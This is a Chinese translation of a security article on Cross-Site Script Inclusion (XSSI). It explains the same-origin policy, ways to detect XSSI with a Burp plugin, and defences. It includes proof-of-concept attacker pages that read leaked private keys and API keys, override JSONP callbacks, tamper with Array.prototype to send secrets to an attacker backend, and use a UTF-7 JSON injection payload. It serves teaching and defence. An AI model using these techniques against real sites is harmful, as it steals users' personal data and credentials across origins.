> 原文链接: https://www.anquanke.com//post/id/85337 


# 【技术分享】XSSI： 一个不出名但是影响广泛的Web漏洞


                                阅读量   
                                **147732**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：scip.ch
                                <br>原文地址：[https://www.scip.ch/en/?labs.20160414](https://www.scip.ch/en/?labs.20160414)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t017403657af8bd395d.jpg)](https://p5.ssl.qhimg.com/t017403657af8bd395d.jpg)

****

**翻译：**[**shinpachi8******](http://bobao.360.cn/member/contribute?uid=2812295712)

**预估稿费：200RMB**

**<strong><strong>投稿方式：发送邮件至**[**linwei#360.cn**](mailto:linwei@360.cn)**，或登陆**[**网页版**](http://bobao.360.cn/contribute/index)**在线投稿**</strong></strong>

**<br>**

**前言**

找到一个特定类别漏洞两个关键组成部分：对漏洞的认识和找到漏洞的难易。 跨站脚本包含(XSSI)漏洞在事实上的公共标准即：OWASP TOP 10中并未被提及。 另外并没有公开的利用的工具来促进找到XSSI。它的影响范围从泄露个人存储信息，基于TOKEN的协议的规避到完成帐户的妥协(猜测意思是应该绕过登录)。 XSSI漏洞相当广泛, 由于检测手段的缺失增大了每一个XSSI漏洞的风险。 在这篇文章中我将演示如果找到XSSI，利用XSSI和如何防护XSSI漏洞。<br>

**<br>**

**背景知识**

这一部分是来讲清楚源和同源策略(SOP)的。如果了解这一部分的可以跳过。

源的概念和基于源的Web内容隔离安全机制（即同源策略）由Netscape在引入JAVASCRIPT的时候一同引入。SOP定义了文档是如何相互影响的。当两个文档属于同一个源时，它们可以相互访问。这实际上是WEB安全的基础。源被大多数浏览器定义为端口，域名和协议。 而微软的IE浏览器是一个例外，它不包括端口。它有自己的安全意义。下边的表是由([Mozilla Developer Network](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy))用URL：[http://store.company.com/dir/page.html](http://store.company.com/dir/page.html)描述了用于SOP的最通用的规则。 

[![](https://p1.ssl.qhimg.com/t01369e97ffba085d0d.png)](https://p1.ssl.qhimg.com/t01369e97ffba085d0d.png)

由于多家浏览器厂商在文档间的相互作用没有一个共同的标准，所以内容隔离是一件非常必要的事情。对于更多信息：安全研究员[Michal Zalewski](https://twitter.com/lcamtuf)在他的书[Tangled Web](https://www.nostarch.com/tangledweb.htm)中有一章的内容都是在写这个问题。

<br>

**XSSI**

Cross-Site Scrite Inclusion(XSSI),一个有些无形但是描述性的名字，指定了一类漏洞：当资源用script标签来包含时，SOP就失效了，因为脚本必须能够包含跨域。因此一个攻击者可以读取用script标签包含的所有内容。

当谈到动态的JavaScript和jsonp，所谓的权限信息（如cookie）用于身份验证时会显得特别有趣。Cookies 与 CSRF一样，从不同的主机来请求时会被包含。这个漏洞在上述的Michal Zalewski的书中的脚注与Sebastian Lekies等人的paper的脚注中被提到。

根据script中数据的内容不同，XSSI可以有不同的利用方式。在广泛传播的敏感数据是个人信息如e-mail， 邮件地址， 生日等。 但是也可以发现tokes, session id,与其它的ID如UID。 最简单的利用方式是检查一个用户是否已经登录(登录 oracle)。获得的信息可以在社会工程或者其它的特定方式的攻击中被滥用。

<br>

**与XSS与CSRF的界限**

XSSI在命名上与XSS相近，在描述上与CSRF相近。它仨之间的共同点即同为客户端攻击。 

与XSS的不同是很容易理解的：在一个XSS的中，恶意代码被放置在受害者的页面，而XSSI中受害者的代码被包含在一个恶意页面中。 而表面上看XSSI与CSRF是很相似的，因为它们都是一个由恶意页面的请求至另一个域，而且这两种情况下，请求都是在用户已经登录的情况下执行的。 而最关键的不同点在于目的。在CSRF中，攻击都想要受害者的页面中执行一个状态改变的动作，比如在一个在线银行应用中进行转帐。在XSSI中攻击者想要跨域泄露数据，以便然后再执行上述的攻击。

<br>

**搜索，找到和利用**

当搜索XSSI时，需要区分四种情况。但是幸运的是利用方式是相似甚至是相同的(就像反射与存储的XSS)。我们可以将四种情况区分如下： 

1. 静态的JavaScript(正常XSSI) 

2. 静态的JavaScript，但是仅在认证后可访问 

3. 动态JavaScript 

4. 非JavaScript



**正常的XSSI**

当一个可公开访问的静态脚本包含敏感信息时，都可以认为是一个常规的XSSI。在这种情况下，几乎只有通过读文件来检测这种问题。也可以用启发式，并用正则表达式来找到私钥，社保或者信息卡帐号。但是一旦情况被确定，利用通常是微不足道的。让我们假设敏感内容设定在一个全局变量中，如下面的现实例子（替换的私钥）:



```
var privateKey = "-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAxaEY8URy0jFmIKn0s/WK6QS/DusEGRhP4Mc2OwblFQkKXHOs
XYfbVmUCySpWCTsPPiKwG2a7+3e5mq9AsjCGvHyyzNmdEMdXAcdrf45xPS/1yYFG
0v8xv6QIJnztMl18xWymaA5j2YGQieA/UNUJHJuvuvIMkZYkkeZlExszF2fRSMJH
FUjnFNiYt0R8agdndexvuxFApYG40Hy6BJWgKW3NxowV9XbHOaDvX+3Bal5tbtrM
IzqTptgldzMGs73bJ+7nUqyv7Dicbn1XD4j9XBYy+FOBhVagSztqMFpOFcfAK7Er
sorY0yWN6aBobtENBUPkeqGiHxBAQ42ki9QkUwIDAQABAoIBAQCThrBx2iDEW2/b
TkOG2vK5A3wEDNfgS8/FAbCv23PCgh8j6I1wvGu1UG4F8P6MoXO9dHN14PjOvQ7m
M5Dd82+A4K0wUfn3fnaqs0zByXkqrdSSeVh/RVTDtBUJdhQylqr/TR3ja2qKATf+
VFGva3gDzQwfR3SucSAXcZ9d5d37x4nzFRa8ogNxxkCUy1PYHqnIpB/4MsOL8f0S
F5LR+u/F67GKFzGZXyh1i/tgIHZCOvftmj2DLx/1EoZyiLSnMABt7XmztIqYXTJG
TnXi8ix4vkwUENfveZb9yKrdmrPGITi+f5FYDlyjeSXZYZqAGhSjI69juNn36gCa
6Idt7I3xAoGBAOenoayBlmGEsWDGL8/XuAUlsceGRSoQ/MrGqx7LSgvkROYDyAfE
Db8vfy6f/qf9OI1EHwzu8QYnwKh8D0zldz9xl9Fwx4k1EIcD2BjTiJMBBk0FeybO
sqe4UwGzJvsTmfhlhJ4zZYLi1wMmkt1q1sMm9gb55nfTUDH8lzWJE/mFAoGBANpm
DcmcaUsSXkbBbmHZiV07EW4BUBpleog6avcNOcdGcylvDs17IwG28toAtOiJqQ/F
qnOqkQ73QXU7HCcmvQoX/tyxJRg/SMO2xMkYeHA+OamMrLvKgbxGLPG5O9Cs8QMl
q944WOrNhSfBE+ghPz4mpBbAxOOw0SoUYwCd52H3AoGAQnTLo8J1UrqPbFTOyJB5
ITjkHHo/g0bmToHZ+3aUYn706Quyqc+rpepJUSXjF2xEefpN8hbmHD7xPSSB+yxl
HlVHGXWCOLF5cVI//zdIGewUU6o73zEy/Xyai4VKrIK+DA2LkxrphzfuOOArB8wr
mkamE/BDFqMPgZeWBWyyx0UCgYEAg9kqp7V6x6yeJ98tEXuv9w3q9ttqDZWIBOgn
nWBpqkl4yuHWMO0O9EELmdrlXKGG5BO0VMH7cuqIpQp7c5NqesaDwZ5cQ6go+KbF
ZJYWV8TpMNfRjEm0SwKerYvjdZaCpiC/AphH7fEHWzmwF+rCcHYJiAb2lnMvw1St
dDjf8H8CgYEA4US7hhi1B2RDSwmNGTTBlGpHqPN73gqx2uOb2VYQTSUA7//b3fkK
pHEXGUaEHxxtEstSOUgT5n1kvo+90x3AbqPg6vAN4TSvX7uYIWENicbutKgjEFJi
TpCpdZksy+sgh/W/h9T7pDH272szBDo6g1TIQMCgPiAt/2yFNWU6Hks=
-----END RSA PRIVATE KEY-----",
    keys = [
      `{` name: 'Key No 1', apiKey: '0c8aab23-2ab5-46c5-a0f2-e52ecf7d6ea8', privateKey: privateKey `}`,
      `{` name: 'Key No 2', apiKey: '1e4b8312-f767-43eb-a16b-d44d3e471198', privateKey: privateKey `}`
    ];
```

简单的将它包含在你的页面然后读变量:



```
&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;Regular XSSI&lt;/title&gt;
    &lt;script src="https://www.vulnerable-domain.tld/script.js"&gt;&lt;/script&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;script&gt;
      alert(JSON.stringify(keys[0]));
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
```

[![](https://p2.ssl.qhimg.com/t015445346b9e4006b9.png)](https://p2.ssl.qhimg.com/t015445346b9e4006b9.png)

<br>

**基于xssi的动态JavaScript 与认证的JavaScript的xssi**

这两类有不同的技术背景，虽然这对测试者来说并无关系。幸运的是其发现与利用是相似的。我写了一个名叫DetectDynamicJSburp插件, 这个插件主要是在审计期间为渗透测试人员进行 web应用检测。

所有的脚本文件是被动扫描的。之后这个文件会被重新请求，只不过这次没有cookie。如果接收的文件与原来的文件两个文件不同，那么将会在target标签中标记等级为Information 。它能找到动态JavaScript与那些当用户认证后才能访问的到的JavaScript。之所以标记为Information ，是因为动态JavaScript并不一定有安全风险。它可以用来处理用户数据，服务引导，在复杂应用中设置变量和与其他的服务(如追踪)来共享数据。

[![](https://p2.ssl.qhimg.com/t01ead16f503d6831b1.png)](https://p2.ssl.qhimg.com/t01ead16f503d6831b1.png)

想知道一个文件是否是脚本，那么就需要过滤器了。这个过滤器在经历不断变化且正在不断发展着。目前这个插件检查文件扩展名为.js，.jsp，与.json。 .json并不是一个正确的脚本扩展名，甚至不是jsonp, 但是这并不妨碍开发者对它的滥用。

为了减少误报，原始文件的第一个字符判断不为｛，因为这目前并不是一个有效的脚本语法。同时对content-type检查是否包含 javascript, jscript, 

ecmascript和json。过滤器也可以识别burpsuite的mimetype识别方法。如果在stateMimeType或者inferredMimeType中包含script，那么它就会被扫描。旁注：该扩展是在burp的1.6.39版本前开发的，其中对检测机制进行改进。尽管如此，也偶尔无法检测到javascript文件。一些过滤器肯定是多余的，但是经验表明如果试图减少一些过滤器会导致漏报。为了进一步减少误报，则检查原始文件的HTTP响应代码不是来自30-X。另一个减少误报的方法：如果第二版的文件（未经认证得到的文件）是一个脚本（非html）且和原始文件不同，那就发送第二次的未认证的请求，来获得第三版的文件。如果两个未经认证的文件以不同的响应结束，那么我们可以总结说这是一个通用的动态脚本且不依赖认证。这种情况经常在时间戳和广告中出现。

[![](https://p0.ssl.qhimg.com/t01af5b76ec94b3b35a.png)](https://p0.ssl.qhimg.com/t01af5b76ec94b3b35a.png)

<br>

**利用**

xssi可以在用户已经认证的上下文中来窃取私钥等。滥用的情况受到开发者想像的限制。但是有些情况反复出现，所以我想说明的是这些情况。

变量如果置于全局命名空间，那么它们很容易被读取。

函数的重写即使对于一个javascript新手来说也不应该成为一个问题。下面的示例来自于一个真实的案例。网站使用jsonp来回调配置页面的用户数据。

```
angular.callbacks._7(`{`"status":STATUS,"body":`{`"demographics":`{`"email":......`}``}``}`)
```

为了得到信息， function _7 必须被重写.



```
&lt;script&gt;
      var angular = function () `{` return 1; `}`;
      angular.callbacks = function () `{` return 1; `}`;      
      angular.callbacks._7 = function (leaked) `{`
  alert(JSON.stringify(leaked));
      `}`;  
&lt;/script&gt;
&lt;script src="https://site.tld/p?jsonp=angular.callbacks._7" type="text/javascript"&gt;&lt;/script&gt;
```

[![](https://p3.ssl.qhimg.com/t01287a6b4fb5b030d1.png)](https://p3.ssl.qhimg.com/t01287a6b4fb5b030d1.png)

也可以适用于全局函数。 在这个例子中，甚至不需要重写函数，只需要提供一个自己的callback函数。



```
&lt;script&gt;
      leak = function (leaked) `{`
  alert(JSON.stringify(leaked));
      `}`;  
&lt;/script&gt;
&lt;script src="https://site.tld/p?jsonp=leak" type="text/javascript"&gt;&lt;/script&gt;
```

如果一个变量并没有在全局命名空间，那么有时候也可以能过prototype tampering来利用。prototype tampering滥用在javascript的设计中，也就是当解释代码时，javascript会遍历prototype 链来找到调用的属性。 下面的例子是在论文The Unexpected Dangers of Dynamic JavaScript 中提取的。演示如何覆盖类型Array的相关函数并访问它，非全局变量也可以泄漏。



```
(function()`{`
  var arr = ["secret1", "secret2", "secret3"];
  // intents to slice out first entry
  var x = arr.slice(1);
  ...
`}`)();
```

在原始代码中，在原始的代码中我们可以通过slice访问数组中我们感兴趣的数据, 当然攻击者可以，如上所说的，重写slice函数以窃取信息。



```
Array.prototype.slice = function()`{`
  // leaks ["secret1", "secret2", "secret3"]
  sendToAttackerBackend(this);
`}`;
```

安全调查员Sebastian Lekies刚刚更新了他的列表。

<br>

**非脚本的xssi**

Takeshi Terada 在他的论文Identifier based XSSI attacks中描述了另一种类型的xssi,通过在脚本标签中包含CSV文件作为源，使用数据作为变量和函数名称，能够跨源地泄露非脚本文件。

第一起公开描述xssi的文档是在2006年。 Jeremiah Grossman的博客 Advanced Web Attack Techniques using GMail 描述了一个xssi，可能重写array的构造函数可以读取到所有google帐号的地址。

在2007年， Joe Walker出版了JSON is not as safe as people think it is 。 他使用了同样的手段来窃取一个array内的json信息。

也有一些其他相关的攻击是由将utf-7编码的内容注入到json中以逃避json格式来进行的。是由Gareth Heyes, Hackvertor的作者， 在他的博客JSON Hijacking 在2011年提出的。在快速测试中，这仍然可能出现了ie和edge中，但是firefox或者chrome并无此问题。

JSON with UTF-7:

```
[`{`'friend':'luke','email':'+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-'`}`]
```

在攻击者的页面包含json:

```
&lt;script src="http://site.tld/json-utf7.json" type="text/javascript" charset="UTF-7"&gt;&lt;/script&gt;
```



**XSSI的防护**

开发者永远也不要把敏感数据放在javascript文件中， 也不要放在jsonp中。这就已经可以阻止1-3这三大类型的大部分攻击。类型4的漏洞问题通常通过浏览器一方来修复。无论如何，将用户信息保存到json文件然后读取的行为应该被禁止。

Takeshi Terada论文中描述的最大的bug被修复了。然而总是可能再一次发现相似的bug。至少这可以通过告诉浏览器不要再猜测content-type来阻止一部分。一些浏览器可以接受尚未标准化的http响应头X-Content-Type-Option:nosniff来做这些。一个正确的Content-Type对于减少xssi的可能性也有帮助。

<br>

**参考链接**

[http://bit.ly/1PmX4EX](http://bit.ly/1PmX4EX)

[http://incompleteness.me/blog/2007/03/05/json-is-not-as-safe-as-people-think-it-is/](http://incompleteness.me/blog/2007/03/05/json-is-not-as-safe-as-people-think-it-is/)

[http://jeremiahgrossman.blogspot.ch/2006/01/advanced-web-attack-techniques-using.html](http://jeremiahgrossman.blogspot.ch/2006/01/advanced-web-attack-techniques-using.html)

[http://sebastian-lekies.de/leak/](http://sebastian-lekies.de/leak/)

[http://www.thespanner.co.uk/2011/05/30/json-hijacking/](http://www.thespanner.co.uk/2011/05/30/json-hijacking/)

[https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)

[https://github.com/luh2/DetectDynamicJS](https://github.com/luh2/DetectDynamicJS)

[https://hackvertor.co.uk/public](https://hackvertor.co.uk/public)

[https://mimesniff.spec.whatwg.org/](https://mimesniff.spec.whatwg.org/)

[https://twitter.com/lcamtuf](https://twitter.com/lcamtuf)

[https://twitter.com/slekies](https://twitter.com/slekies)

[https://www.mbsd.jp/Whitepaper/xssi.pdf](https://www.mbsd.jp/Whitepaper/xssi.pdf)

[https://www.nostarch.com/tangledweb.htm](https://www.nostarch.com/tangledweb.htm)

[https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project)

[https://www.owasp.org/index.php/XSS](https://www.owasp.org/index.php/XSS)

[https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf)
